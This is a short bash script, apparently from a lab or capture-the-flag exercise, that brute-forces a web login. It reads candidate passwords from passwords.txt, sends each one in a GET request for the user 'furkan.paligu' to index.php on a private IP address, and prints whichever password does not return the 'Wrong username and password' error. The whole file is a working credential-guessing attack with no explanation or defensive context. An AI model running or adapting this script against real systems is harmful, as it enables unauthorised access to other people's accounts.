
file=passwords.txt
ip=192.168.3.151
cat $file | while read pass
do 
result=$(curl -s "$ip/index.php?username=furkan.paligu&password=$pass" | grep "Wrong username and password")
if [[ -z "$result" ]] 
then
echo $pass
fi
done
